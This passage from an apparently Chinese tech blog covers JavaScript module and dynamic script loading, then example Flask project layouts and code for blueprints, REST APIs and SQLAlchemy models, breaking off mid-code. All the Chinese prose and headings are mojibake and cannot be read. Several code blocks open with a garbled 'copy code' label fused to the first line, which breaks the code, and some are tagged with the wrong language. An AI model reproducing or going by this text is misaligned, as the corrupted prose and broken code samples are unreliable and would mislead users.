æ–‡ä»¶ï¼š</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from the module!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åï¼Œåœ¨ HTML ä¸­å¼•å…¥æ¨¡å—å¹¶ä½¿ç”¨ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>JavaScript Modules Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">import</span> &#123; greet &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./module.js&#x27;</span>;</span><br><span class="language-javascript">        <span class="hljs-title function_">greet</span>();</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>JavaScript Modules<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="é€‚ç”¨åœºæ™¯ï¼š-3"><a href="#é€‚ç”¨åœºæ™¯ï¼š-3" class="headerlink" title="é€‚ç”¨åœºæ™¯ï¼š"></a>é€‚ç”¨åœºæ™¯ï¼š</h4><ul><li>é€‚åˆå¤§å‹åº”ç”¨ç¨‹åºï¼Œèƒ½å¤Ÿä»¥æ¨¡å—åŒ–çš„æ–¹å¼ç»„ç»‡ä»£ç ã€‚</li><li>å…è®¸ä½¿ç”¨ ES6 çš„ <code>import</code> å’Œ <code>export</code>ï¼Œä¾¿äºä¾èµ–ç®¡ç†ã€‚</li></ul><h4 id="æ³¨æ„äº‹é¡¹ï¼š-3"><a href="#æ³¨æ„äº‹é¡¹ï¼š-3" class="headerlink" title="æ³¨æ„äº‹é¡¹ï¼š"></a>æ³¨æ„äº‹é¡¹ï¼š</h4><ul><li><strong>æµè§ˆå™¨æ”¯æŒ</strong>ï¼šç°ä»£æµè§ˆå™¨éƒ½æ”¯æŒ <code>&lt;script type=&quot;module&quot;&gt;</code>ï¼Œä½†åœ¨æ—§æµè§ˆå™¨ä¸­å¯èƒ½ä¸å…¼å®¹ã€‚</li><li><strong>ä¸¥æ ¼æ¨¡å¼</strong>ï¼šæ¨¡å—æ–‡ä»¶ä¸­é»˜è®¤ä½¿ç”¨ä¸¥æ ¼æ¨¡å¼ï¼ˆ<code>strict mode</code>ï¼‰ï¼Œè¿™ä¼šå¸¦æ¥æ›´ä¸¥æ ¼çš„è¯­æ³•æ£€æŸ¥ã€‚</li></ul><hr><h3 id="6-åŠ¨æ€åŠ è½½-JavaScript"><a href="#6-åŠ¨æ€åŠ è½½-JavaScript" class="headerlink" title="6. åŠ¨æ€åŠ è½½ JavaScript"></a>6. <strong>åŠ¨æ€åŠ è½½ JavaScript</strong></h3><p>æœ‰æ—¶ï¼ŒJavaScript æ–‡ä»¶éœ€è¦åœ¨ç‰¹å®šæ¡ä»¶ä¸‹æˆ–äº‹ä»¶å‘ç”Ÿåå†åŠ¨æ€åŠ è½½ã€‚è¿™ç§æ–¹å¼é€šå¸¸ç”¨äºæé«˜æ€§èƒ½æˆ–åœ¨ç‰¹å®šåŠŸèƒ½éœ€æ±‚æ—¶åŠ è½½é¢å¤–çš„è„šæœ¬ã€‚</p><h4 id="ç”¨æ³•ï¼š-6"><a href="#ç”¨æ³•ï¼š-6" class="headerlink" title="ç”¨æ³•ï¼š"></a>ç”¨æ³•ï¼š</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Dynamic Script Loading Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loadScriptButton&quot;</span>&gt;</span>Load Script<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loadScriptButton&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">let</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);</span><br><span class="language-javascript">            script.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;dynamic-script.js&#x27;</span>;</span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(script);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="é€‚ç”¨åœºæ™¯ï¼š-4"><a href="#é€‚ç”¨åœºæ™¯ï¼š-4" class="headerlink" title="é€‚ç”¨åœºæ™¯ï¼š"></a>é€‚ç”¨åœºæ™¯ï¼š</h4><ul><li>åŠ¨æ€åŠ è½½èµ„æºä»¥å‡å°‘åˆå§‹é¡µé¢åŠ è½½æ—¶é—´ã€‚</li><li>æŒ‰éœ€åŠ è½½è„šæœ¬ï¼Œä¾‹å¦‚ç”¨æˆ·ç‚¹å‡»æŒ‰é’®åæ‰åŠ è½½è„šæœ¬ã€‚</li></ul><h4 id="æ³¨æ„äº‹é¡¹ï¼š-4"><a href="#æ³¨æ„äº‹é¡¹ï¼š-4" class="headerlink" title="æ³¨æ„äº‹é¡¹ï¼š"></a>æ³¨æ„äº‹é¡¹ï¼š</h4><ul><li>åŠ¨æ€åŠ è½½çš„è„šæœ¬æ˜¯å¼‚æ­¥çš„ï¼Œå› æ­¤è¦ç¡®ä¿ä¾èµ–å…³ç³»ä¸ä¼šè¢«ç ´åã€‚å¦‚æœéœ€è¦æŒ‰é¡ºåºåŠ è½½å¤šä¸ªåŠ¨æ€è„šæœ¬ï¼Œå¯ä»¥é€šè¿‡å›è°ƒæˆ– <code>Promise</code> æ¥æ§åˆ¶ã€‚</li></ul><hr><p>å¥½çš„ï¼æ¥ä¸‹æ¥æˆ‘å°†è¯¦ç»†å±•å¼€ <strong>Flask æ¡†æ¶æ¶æ„ä¸åŸºç¡€æ¦‚å¿µã€å¸¸è§çš„å®‰å…¨æ¼æ´ã€æ”»å‡»åˆ©ç”¨æ–¹æ³•ã€å®‰å…¨é˜²å¾¡æªæ–½ã€æ¼æ´æ€»ç»“ç­‰</strong>ï¼ŒåŒ…æ‹¬è¯¦ç»†çš„ä»£ç ç¤ºä¾‹å’Œè§£é‡Šã€‚</p><hr><h2 id="Flask-æ¡†æ¶æ¶æ„ä¸åŸºç¡€æ¦‚å¿µ"><a href="#Flask-æ¡†æ¶æ¶æ„ä¸åŸºç¡€æ¦‚å¿µ" class="headerlink" title="Flask æ¡†æ¶æ¶æ„ä¸åŸºç¡€æ¦‚å¿µ"></a>Flask æ¡†æ¶æ¶æ„ä¸åŸºç¡€æ¦‚å¿µ</h2><h2 id="1-ç®€å•-Flask-é¡¹ç›®ç»“æ„"><a href="#1-ç®€å•-Flask-é¡¹ç›®ç»“æ„" class="headerlink" title="1. ç®€å• Flask é¡¹ç›®ç»“æ„"></a><strong>1. ç®€å• Flask é¡¹ç›®ç»“æ„</strong></h2><p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå°å‹æˆ–å®éªŒæ€§é¡¹ç›®ï¼Œç”¨äºå¿«é€Ÿæ„å»ºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">bashå¤åˆ¶ä»£ç /project-root<br>â”‚<br>â”œâ”€â”€ app.py              <span class="hljs-comment"># Flask åº”ç”¨ä¸»å…¥å£</span><br>â”œâ”€â”€ /static             <span class="hljs-comment"># é™æ€èµ„æºç›®å½•ï¼ˆCSSã€JSã€å›¾ç‰‡ï¼‰</span><br>â”‚   â”œâ”€â”€ style.css<br>â”‚   â””â”€â”€ script.js<br>â”œâ”€â”€ /templates          <span class="hljs-comment"># HTML æ¨¡æ¿ç›®å½•</span><br>â”‚   â””â”€â”€ index.html      <span class="hljs-comment"># ä¸»é¡µé¢æ¨¡æ¿</span><br>â”œâ”€â”€ requirements.txt    <span class="hljs-comment"># Python ä¾èµ–åŒ…åˆ—è¡¨</span><br>â””â”€â”€ README.md           <span class="hljs-comment"># é¡¹ç›®è¯´æ˜æ–‡ä»¶</span><br></code></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ä»£ç ï¼š<code>app.py</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">pythonå¤åˆ¶ä»£ç <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="2-åŸºäºè“å›¾çš„-Flask-é¡¹ç›®ç»“æ„"><a href="#2-åŸºäºè“å›¾çš„-Flask-é¡¹ç›®ç»“æ„" class="headerlink" title="2. åŸºäºè“å›¾çš„ Flask é¡¹ç›®ç»“æ„"></a><strong>2. åŸºäºè“å›¾çš„ Flask é¡¹ç›®ç»“æ„</strong></h2><p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šé€‚ç”¨äºä¸­å‹é¡¹ç›®ï¼Œé€šè¿‡è“å›¾ï¼ˆBlueprintï¼‰æ¨¡å—åŒ–ç®¡ç†è·¯ç”±å’Œé€»è¾‘ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">bashå¤åˆ¶ä»£ç /project-root<br>â”‚<br>â”œâ”€â”€ app.py              <span class="hljs-comment"># Flask åº”ç”¨å…¥å£æ–‡ä»¶</span><br>â”œâ”€â”€ /static             <span class="hljs-comment"># é™æ€èµ„æºç›®å½•</span><br>â”‚   â”œâ”€â”€ style.css<br>â”‚   â””â”€â”€ script.js<br>â”œâ”€â”€ /templates          <span class="hljs-comment"># HTML æ¨¡æ¿ç›®å½•</span><br>â”‚   â””â”€â”€ index.html<br>â”œâ”€â”€ /blueprints         <span class="hljs-comment"># è“å›¾æ¨¡å—</span><br>â”‚   â”œâ”€â”€ __init__.py     <span class="hljs-comment"># åˆå§‹åŒ–è“å›¾</span><br>â”‚   â””â”€â”€ user.py         <span class="hljs-comment"># ç”¨æˆ·ç›¸å…³è·¯ç”±å’Œé€»è¾‘</span><br>â”œâ”€â”€ requirements.txt    <span class="hljs-comment"># é¡¹ç›®ä¾èµ–</span><br>â””â”€â”€ README.md           <span class="hljs-comment"># é¡¹ç›®è¯´æ˜</span><br></code></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ï¼š<code>blueprints/user.py</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">pythonå¤åˆ¶ä»£ç <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Blueprint, render_template<br><br>user_bp = Blueprint(<span class="hljs-string">&#x27;user&#x27;</span>, __name__)<br><br><span class="hljs-meta">@user_bp.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user/&lt;username&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">profile</span>(<span class="hljs-params">username</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;profile.html&#x27;</span>, username=username)<br></code></pre></td></tr></table></figure><p><strong>åœ¨ <code>app.py</code> ä¸­æ³¨å†Œè“å›¾ï¼š</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">pythonå¤åˆ¶ä»£ç <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> blueprints.<span class="hljs-keyword">user</span> <span class="hljs-keyword">import</span> user_bp<br><br>app = Flask(__name__)<br>app.register_blueprint(user_bp)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-keyword">debug</span>=<span class="hljs-keyword">True</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="3-RESTful-API-é¡¹ç›®ç»“æ„"><a href="#3-RESTful-API-é¡¹ç›®ç»“æ„" class="headerlink" title="3. RESTful API é¡¹ç›®ç»“æ„"></a><strong>3. RESTful API é¡¹ç›®ç»“æ„</strong></h2><p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå¼€å‘ RESTful APIï¼Œå‰åç«¯åˆ†ç¦»çš„é¡¹ç›®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">bashå¤åˆ¶ä»£ç /project-root<br>â”‚<br>â”œâ”€â”€ app.py              <span class="hljs-comment"># Flask åº”ç”¨å…¥å£æ–‡ä»¶</span><br>â”œâ”€â”€ /api                <span class="hljs-comment"># API æ¨¡å—ç›®å½•</span><br>â”‚   â”œâ”€â”€ __init__.py     <span class="hljs-comment"># åˆå§‹åŒ– API è“å›¾</span><br>â”‚   â””â”€â”€ routes.py       <span class="hljs-comment"># API è·¯ç”±</span><br>â”œâ”€â”€ /models             <span class="hljs-comment"># æ•°æ®æ¨¡å‹ç›®å½•</span><br>â”‚   â””â”€â”€ user.py         <span class="hljs-comment"># ç”¨æˆ·æ¨¡å‹å®šä¹‰</span><br>â”œâ”€â”€ /config             <span class="hljs-comment"># é…ç½®æ–‡ä»¶ç›®å½•</span><br>â”‚   â””â”€â”€ settings.py     <span class="hljs-comment"># åº”ç”¨é…ç½®</span><br>â”œâ”€â”€ requirements.txt    <span class="hljs-comment"># ä¾èµ–åˆ—è¡¨</span><br>â””â”€â”€ README.md           <span class="hljs-comment"># é¡¹ç›®è¯´æ˜</span><br></code></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ï¼š<code>api/routes.py</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">pythonå¤åˆ¶ä»£ç <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Blueprint, jsonify<br><br>api_bp = Blueprint(<span class="hljs-string">&#x27;api&#x27;</span>, __name__)<br><br><span class="hljs-meta">@api_bp.route(<span class="hljs-params"><span class="hljs-string">&#x27;/api/users&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_users</span>():<br>    users = [&#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span>&#125;, &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Bob&quot;</span>&#125;]<br>    <span class="hljs-keyword">return</span> jsonify(users)<br></code></pre></td></tr></table></figure><p><strong>åœ¨ <code>app.py</code> ä¸­æ³¨å†Œ API è“å›¾ï¼š</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">pythonå¤åˆ¶ä»£ç <span class="hljs-keyword">from</span> flask import Flask<br><span class="hljs-keyword">from</span> api.routes import api_bp<br><br>app = Flask(__name__)<br>app.register_blueprint(api_bp, <span class="hljs-attribute">url_prefix</span>=<span class="hljs-string">&#x27;/api&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.<span class="hljs-built_in">run</span>(<span class="hljs-attribute">debug</span>=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><hr><h2 id="4-å¤§å‹-Flask-é¡¹ç›®ç»“æ„"><a href="#4-å¤§å‹-Flask-é¡¹ç›®ç»“æ„" class="headerlink" title="4. å¤§å‹ Flask é¡¹ç›®ç»“æ„"></a><strong>4. å¤§å‹ Flask é¡¹ç›®ç»“æ„</strong></h2><p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå¤§å‹é¡¹ç›®ï¼Œä½¿ç”¨å¤šä¸ªæ¨¡å—ã€æ•°æ®åº“ã€è®¤è¯é€»è¾‘å’Œé…ç½®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">bashå¤åˆ¶ä»£ç /project-root<br>â”‚<br>â”œâ”€â”€ /app                <span class="hljs-comment"># Flask åº”ç”¨ç›®å½•</span><br>â”‚   â”œâ”€â”€ __init__.py     <span class="hljs-comment"># åº”ç”¨åˆå§‹åŒ–</span><br>â”‚   â”œâ”€â”€ /auth           <span class="hljs-comment"># è®¤è¯æ¨¡å—</span><br>â”‚   â”‚   â”œâ”€â”€ routes.py   <span class="hljs-comment"># ç™»å½•ã€æ³¨å†Œè·¯ç”±</span><br>â”‚   â”‚   â””â”€â”€ forms.py    <span class="hljs-comment"># ç™»å½•è¡¨å•é€»è¾‘</span><br>â”‚   â”œâ”€â”€ /main           <span class="hljs-comment"># ä¸»åº”ç”¨æ¨¡å—</span><br>â”‚   â”‚   â””â”€â”€ routes.py   <span class="hljs-comment"># ä¸»é¡µé¢è·¯ç”±</span><br>â”‚   â”œâ”€â”€ /models         <span class="hljs-comment"># æ•°æ®æ¨¡å‹</span><br>â”‚   â”‚   â””â”€â”€ user.py     <span class="hljs-comment"># ç”¨æˆ·æ•°æ®æ¨¡å‹</span><br>â”‚   â””â”€â”€ /templates      <span class="hljs-comment"># HTML æ¨¡æ¿ç›®å½•</span><br>â”‚       â”œâ”€â”€ base.html   <span class="hljs-comment"># åŸºç¡€æ¨¡æ¿</span><br>â”‚       â””â”€â”€ index.html  <span class="hljs-comment"># ä¸»é¡µé¢æ¨¡æ¿</span><br>â”‚<br>â”œâ”€â”€ /migrations         <span class="hljs-comment"># æ•°æ®åº“è¿ç§»æ–‡ä»¶</span><br>â”œâ”€â”€ /instance           <span class="hljs-comment"># æœ¬åœ°é…ç½®æ–‡ä»¶</span><br>â”‚   â””â”€â”€ config.py       <span class="hljs-comment"># æœ¬åœ°é…ç½®</span><br>â”œâ”€â”€ config.py           <span class="hljs-comment"># é»˜è®¤é…ç½®æ–‡ä»¶</span><br>â”œâ”€â”€ manage.py           <span class="hljs-comment"># é¡¹ç›®ç®¡ç†è„šæœ¬</span><br>â”œâ”€â”€ requirements.txt    <span class="hljs-comment"># ä¾èµ–åŒ…åˆ—è¡¨</span><br>â””â”€â”€ README.md           <span class="hljs-comment"># é¡¹ç›®è¯´æ˜</span><br></code></pre></td></tr></table></figure><p><strong><code>app/__init__.py</code> ç¤ºä¾‹ï¼š</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gradle">pythonå¤åˆ¶ä»£ç <span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br><span class="hljs-keyword">def</span> create_app():<br>    app = Flask(__name__)<br>    app.config.from_object(<span class="hljs-string">&#x27;config&#x27;</span>)<br><br>    <span class="hljs-keyword">from</span> app.auth.routes <span class="hljs-keyword">import</span> auth_bp<br>    <span class="hljs-keyword">from</span> app.main.routes <span class="hljs-keyword">import</span> main_bp<br><br>    app.register_blueprint(auth_bp)<br>    app.register_blueprint(main_bp)<br><br>    <span class="hljs-keyword">return</span> app<br></code></pre></td></tr></table></figure><p><strong><code>manage.py</code> ç¤ºä¾‹ï¼š</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">pythonå¤åˆ¶ä»£ç <span class="hljs-keyword">from</span> app import create_app<br><br>app = create_app()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.<span class="hljs-built_in">run</span>()<br></code></pre></td></tr></table></figure><hr><h2 id="5-Flask-SQLAlchemy-é¡¹ç›®ç»“æ„"><a href="#5-Flask-SQLAlchemy-é¡¹ç›®ç»“æ„" class="headerlink" title="5. Flask + SQLAlchemy é¡¹ç›®ç»“æ„"></a><strong>5. Flask + SQLAlchemy é¡¹ç›®ç»“æ„</strong></h2><p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šéœ€è¦ä½¿ç”¨æ•°æ®åº“ï¼ˆå¦‚ <strong>PostgreSQL</strong> æˆ– <strong>MySQL</strong>ï¼‰çš„é¡¹ç›®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">bashå¤åˆ¶ä»£ç /project-root<br>â”‚<br>â”œâ”€â”€ app.py              <span class="hljs-comment"># åº”ç”¨å…¥å£æ–‡ä»¶</span><br>â”œâ”€â”€ /models             <span class="hljs-comment"># æ•°æ®æ¨¡å‹ç›®å½•</span><br>â”‚   â””â”€â”€ user.py         <span class="hljs-comment"># ç”¨æˆ·æ¨¡å‹å®šä¹‰</span><br>â”œâ”€â”€ /migrations         <span class="hljs-comment"># æ•°æ®åº“è¿ç§»æ–‡ä»¶</span><br>â”œâ”€â”€ config.py           <span class="hljs-comment"># æ•°æ®åº“å’Œåº”ç”¨é…ç½®</span><br>â”œâ”€â”€ requirements.txt    <span class="hljs-comment"># ä¾èµ–åŒ…åˆ—è¡¨</span><br>â””â”€â”€ README.md           <span class="hljs-comment"># é¡¹ç›®è¯´æ˜</span><br></code></pre></td></tr></table></figure><p><strong><code>models/user.py</code> ç¤ºä¾‹ï¼š</strong></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">python</span>å¤åˆ¶ä»£ç from flask_sqlalchemy <span class="hljs-keyword">import</span> SQLAlchemy<br><br><span class="hljs-title">db</span> = <span class="hljs-type">SQLAlchemy</span>()<br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">User</span>(<span class="hljs-title">db</span>.<span class="hljs-type">Model</span>):</span><br><span class="hljs-class">    id = db.<span class="hljs-type">Column</span>(<span class="hljs-title">db</span>.<span class="hljs-type">Integer</span>, <span class="hljs-title">primary_key</span>=<span class="hljs-type">True</span>)</span><br><span class="hljs-class">    username = db.<span class="hljs-type">Column</span>(<span class="hljs-title">db</span>.<span class="hljs-type">String(80)</span>, <span class="hljs-title">unique</span>=<span class="hljs-type">True</span>, <span class="hljs-title">nullable</span>=<span class="hljs-type">False</span>)</span><br><span class="hljs-class">    email = db.<span class="hljs-type">Column</span>(<span class="hljs-title">db</span>.<span class="hljs-type">String(120)</span>, <span class="hljs-title">unique</span>=<span 